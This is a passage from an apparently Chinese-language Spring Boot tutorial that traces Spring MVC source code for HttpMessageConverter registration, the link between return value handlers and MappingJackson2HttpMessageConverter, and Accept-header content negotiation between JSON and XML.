class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.detectAllHandlerAdapters) &#123;<br><span class="hljs-comment">// Find all HandlerAdapters in the ApplicationContext, including ancestor contexts.</span><br>Map&lt;String, HandlerAdapter&gt; matchingBeans =<br>BeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerAdapter.class, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!matchingBeans.isEmpty()) &#123;<br><span class="hljs-built_in">this</span>.handlerAdapters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(matchingBeans.values());<br><span class="hljs-comment">// We keep HandlerAdapters in sorted order.</span><br>AnnotationAwareOrderComparator.sort(<span class="hljs-built_in">this</span>.handlerAdapters);<br>&#125;<br>&#125;<br>      ...<br></code></pre></td></tr></table></figure><p>上述代码会加载<code>ApplicationContext</code>的所有<code>HandlerAdapter</code>，用来处理<code>@RequestMapping</code>的<code>RequestMappingHandlerAdapter</code>实现<code>HandlerAdapter</code>接口，<code>RequestMappingHandlerAdapter</code>也被实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br>    <br>    ...<br><br>    <span class="hljs-keyword">private</span> List&lt;HttpMessageConverter&lt;?&gt;&gt; messageConverters;<br>    <br>    ...<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-title function_">RequestMappingHandlerAdapter</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-built_in">this</span>.messageConverters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">4</span>);<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayHttpMessageConverter</span>());<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringHttpMessageConverter</span>());<br><span class="hljs-keyword">if</span> (!shouldIgnoreXml) &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SourceHttpMessageConverter</span>&lt;&gt;());<br>&#125;<br><span class="hljs-keyword">catch</span> (Error err) &#123;<br><span class="hljs-comment">// Ignore when no TransformerFactory implementation is available</span><br>&#125;<br>&#125;<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AllEncompassingFormHttpMessageConverter</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>在构造器中看到<strong>一堆</strong><code>HttpMessageConverter</code>。接着，重点查看<code>AllEncompassingFormHttpMessageConverter</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AllEncompassingFormHttpMessageConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FormHttpMessageConverter</span> &#123;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Boolean flag controlled by a &#123;<span class="hljs-doctag">@code</span> spring.xml.ignore&#125; system property that instructs Spring to</span><br><span class="hljs-comment"> * ignore XML, i.e. to not initialize the XML-related infrastructure.</span><br><span class="hljs-comment"> * &lt;p&gt;The default is &quot;false&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">shouldIgnoreXml</span> <span class="hljs-operator">=</span> SpringProperties.getFlag(<span class="hljs-string">&quot;spring.xml.ignore&quot;</span>);<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jaxb2Present;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jackson2Present;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jackson2XmlPresent;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jackson2SmilePresent;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> gsonPresent;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jsonbPresent;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> kotlinSerializationJsonPresent;<br><br><span class="hljs-keyword">static</span> &#123;<br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> AllEncompassingFormHttpMessageConverter.class.getClassLoader();<br>jaxb2Present = ClassUtils.isPresent(<span class="hljs-string">&quot;javax.xml.bind.Binder&quot;</span>, classLoader);<br>jackson2Present = ClassUtils.isPresent(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.ObjectMapper&quot;</span>, classLoader) &amp;&amp;<br>ClassUtils.isPresent(<span class="hljs-string">&quot;com.fasterxml.jackson.core.JsonGenerator&quot;</span>, classLoader);<br>jackson2XmlPresent = ClassUtils.isPresent(<span class="hljs-string">&quot;com.fasterxml.jackson.dataformat.xml.XmlMapper&quot;</span>, classLoader);<br>jackson2SmilePresent = ClassUtils.isPresent(<span class="hljs-string">&quot;com.fasterxml.jackson.dataformat.smile.SmileFactory&quot;</span>, classLoader);<br>gsonPresent = ClassUtils.isPresent(<span class="hljs-string">&quot;com.google.gson.Gson&quot;</span>, classLoader);<br>jsonbPresent = ClassUtils.isPresent(<span class="hljs-string">&quot;javax.json.bind.Jsonb&quot;</span>, classLoader);<br>kotlinSerializationJsonPresent = ClassUtils.isPresent(<span class="hljs-string">&quot;kotlinx.serialization.json.Json&quot;</span>, classLoader);<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">AllEncompassingFormHttpMessageConverter</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">if</span> (!shouldIgnoreXml) &#123;<br><span class="hljs-keyword">try</span> &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SourceHttpMessageConverter</span>&lt;&gt;());<br>&#125;<br><span class="hljs-keyword">catch</span> (Error err) &#123;<br><span class="hljs-comment">// Ignore when no TransformerFactory implementation is available</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (jaxb2Present &amp;&amp; !jackson2XmlPresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jaxb2RootElementHttpMessageConverter</span>());<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (jackson2Present) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MappingJackson2HttpMessageConverter</span>());<span class="hljs-comment">//&lt;----重点看这里</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (gsonPresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GsonHttpMessageConverter</span>());<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jsonbPresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonbHttpMessageConverter</span>());<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (kotlinSerializationJsonPresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KotlinSerializationJsonHttpMessageConverter</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span> (jackson2XmlPresent &amp;&amp; !shouldIgnoreXml) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MappingJackson2XmlHttpMessageConverter</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span> (jackson2SmilePresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MappingJackson2SmileHttpMessageConverter</span>());<br>&#125;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FormHttpMessageConverter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;MultiValueMap&lt;String, ?&gt;&gt; &#123;<br>    <br>    ...<br>        <br>    <span class="hljs-keyword">private</span> List&lt;HttpMessageConverter&lt;?&gt;&gt; partConverters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <br>    ...<br>        <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPartConverter</span><span class="hljs-params">(HttpMessageConverter&lt;?&gt; partConverter)</span> &#123;<br>Assert.notNull(partConverter, <span class="hljs-string">&quot;&#x27;partConverter&#x27; must not be null&quot;</span>);<br><span class="hljs-built_in">this</span>.partConverters.add(partConverter);<br>&#125;<br>    <br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在<code>AllEncompassingFormHttpMessageConverter</code>类构造器看到<code>MappingJackson2HttpMessageConverter</code>类的实例化，<code>AllEncompassingFormHttpMessageConverter</code><strong>包含</strong><code>MappingJackson2HttpMessageConverter</code>。</p><p> <code>ReturnValueHandler</code>是怎么与<code>MappingJackson2HttpMessageConverter</code>关联起来？请看下节。</p><h3 id="ReturnValueHandler与MappingJackson2HttpMessageConverter关联"><a href="#ReturnValueHandler与MappingJackson2HttpMessageConverter关联" class="headerlink" title="ReturnValueHandler与MappingJackson2HttpMessageConverter关联"></a>ReturnValueHandler与MappingJackson2HttpMessageConverter关联</h3><p>再次回顾<code>RequestMappingHandlerAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br>    <br>    ...<br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> HandlerMethodReturnValueHandlerComposite returnValueHandlers;<span class="hljs-comment">//我们关注的returnValueHandlers</span><br>    <br>   <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><span class="hljs-comment">//本方法在AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> ModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-keyword">return</span> handleInternal(request, response, (HandlerMethod) handler);<br>&#125;<br>        <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>ModelAndView mav;<br>        ...<br>        mav = invokeHandlerMethod(request, response, handlerMethod);<br>        ...<br><span class="hljs-keyword">return</span> mav;<br>&#125;<br>    <br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">WebDataBinderFactory</span> <span class="hljs-variable">binderFactory</span> <span class="hljs-operator">=</span> getDataBinderFactory(handlerMethod);<br><span class="hljs-type">ModelFactory</span> <span class="hljs-variable">modelFactory</span> <span class="hljs-operator">=</span> getModelFactory(handlerMethod, binderFactory);<br><br><span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<br>invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//&lt;---我们关注的returnValueHandlers</span><br>invocableMethod.setHandlerMethodReturnValueHandlers(<span class="hljs-built_in">this</span>.returnValueHandlers);<br>&#125;<br>            <br>            ...<br>            <br>invocableMethod.invokeAndHandle(webRequest, mavContainer);<br><span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>webRequest.requestCompleted();<br>&#125;<br>&#125;<br>    <br>   <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterPropertiesSet</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">// Do this first, it may add ResponseBody advice beans</span><br><br>        ...<br>        <br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//赋值returnValueHandlers</span><br>List&lt;HandlerMethodReturnValueHandler&gt; handlers = getDefaultReturnValueHandlers();<br><span class="hljs-built_in">this</span>.returnValueHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerMethodReturnValueHandlerComposite</span>().addHandlers(handlers);<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-keyword">private</span> List&lt;HandlerMethodReturnValueHandler&gt; <span class="hljs-title function_">getDefaultReturnValueHandlers</span><span class="hljs-params">()</span> &#123;<br>List&lt;HandlerMethodReturnValueHandler&gt; handlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">20</span>);<br><br>...<br><span class="hljs-comment">// Annotation-based return value types</span><br>        <span class="hljs-comment">//这里就是 ReturnValueHandler与 MappingJackson2HttpMessageConverter关联 的关键点</span><br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestResponseBodyMethodProcessor</span>(getMessageConverters(),<span class="hljs-comment">//&lt;---MessageConverters也就传参传进来的</span><br><span class="hljs-built_in">this</span>.contentNegotiationManager, <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<span class="hljs-comment">//</span><br>        ...<br><br><span class="hljs-keyword">return</span> handlers;<br>&#125;<br>    <br>    <span class="hljs-comment">//------</span><br>    <br>    <span class="hljs-keyword">public</span> List&lt;HttpMessageConverter&lt;?&gt;&gt; getMessageConverters() &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.messageConverters;<br>&#125;<br>    <br>    <span class="hljs-comment">//RequestMappingHandlerAdapter构造器已初始化部分messageConverters</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">RequestMappingHandlerAdapter</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-built_in">this</span>.messageConverters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">4</span>);<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayHttpMessageConverter</span>());<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringHttpMessageConverter</span>());<br><span class="hljs-keyword">if</span> (!shouldIgnoreXml) &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SourceHttpMessageConverter</span>&lt;&gt;());<br>&#125;<br><span class="hljs-keyword">catch</span> (Error err) &#123;<br><span class="hljs-comment">// Ignore when no TransformerFactory implementation is available</span><br>&#125;<br>&#125;<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AllEncompassingFormHttpMessageConverter</span>());<br>&#125;<br><br>    ...<br>              <br>&#125;<br></code></pre></td></tr></table></figure><p>应用中<code>WebMvcAutoConfiguration</code>（底层是<code>WebMvcConfigurationSupport</code>实现）传入更多<code>messageConverters</code>，其中就包含<code>MappingJackson2HttpMessageConverter</code>。</p><h2 id="39、响应处理-【源码分析】-内容协商原理"><a href="#39、响应处理-【源码分析】-内容协商原理" class="headerlink" title="39、响应处理-【源码分析】-内容协商原理"></a>39、响应处理-【源码分析】-内容协商原理</h2><p>根据客户端接收能力不同，返回不同媒体类型的数据。</p><p>引入XML依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.dataformat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-dataformat-xml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可用Postman软件分别测试返回json和xml：只需要改变请求头中Accept字段（application&#x2F;json、application&#x2F;xml）。</p><p>Http协议中规定的，Accept字段告诉服务器本客户端可以接收的数据类型。</p><p><strong>内容协商原理</strong>：</p><ol><li>判断当前响应头中是否已经有确定的媒体类型<code>MediaType</code>。</li><li>获取客户端（PostMan、浏览器）支持接收的内容类型。（获取客户端Accept请求头字段application&#x2F;xml）（这一步在下一节有详细介绍）<ul><li><code>contentNegotiationManager</code> 内容协商管理器 默认使用基于请求头的策略</li><li><code>HeaderContentNegotiationStrategy</code>  确定客户端可以接收的内容类型</li></ul></li><li>遍历循环所有当前系统的 <code>MessageConverter</code>，看谁支持操作这个对象（Person）</li><li>找到支持操作Person的converter，把converter支持的媒体类型统计出来。</li><li>客户端需要application&#x2F;xml，服务端有10种MediaType。</li><li>进行内容协商的最佳匹配媒体类型</li><li>用 支持 将对象转为 最佳匹配媒体类型 的converter。调用它进行转化 。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//RequestResponseBodyMethodProcessor继承这类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractMessageConverterMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodArgumentResolver</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//跟上一节的代码一致</span><br>    <span class="hljs-keyword">protected</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeWithMessageConverters</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> T value, MethodParameter returnType,</span><br><span class="hljs-params">                ServletServerHttpRequest inputMessage, ServletServerHttpResponse outputMessage)</span><br>                <span class="hljs-keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException &#123;<br><br>            Object body;<br>            Class&lt;?&gt; valueType;<br>            Type targetType;<br><br>            <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> CharSequence) &#123;<br>                body = value.toString();<br>                valueType = String.class;<br>                targetType = String.class;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                body = value;<br>                valueType = getReturnValueType(body, returnType);<br>                targetType = GenericTypeResolver.resolveType(getGenericType(returnType), returnType.getContainingClass());<br>            &#125;<br><br>...<br><br>            <span class="hljs-comment">//本节重点</span><br>            <span class="hljs-comment">//内容协商（浏览器默认会以请求头(参数Accept)的方式告诉服务器他能接受什么样的内容类型）</span><br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">selectedMediaType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> outputMessage.getHeaders().getContentType();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isContentTypePreset</span> <span class="hljs-operator">=</span> contentType != <span class="hljs-literal">null</span> &amp;&amp; contentType.isConcrete();<br>            <span class="hljs-keyword">if</span> (isContentTypePreset) &#123;<br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Found &#x27;Content-Type:&quot;</span> + contentType + <span class="hljs-string">&quot;&#x27; in response&quot;</span>);<br>                &#125;<br>                selectedMediaType = contentType;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> inputMessage.getServletRequest();<br>                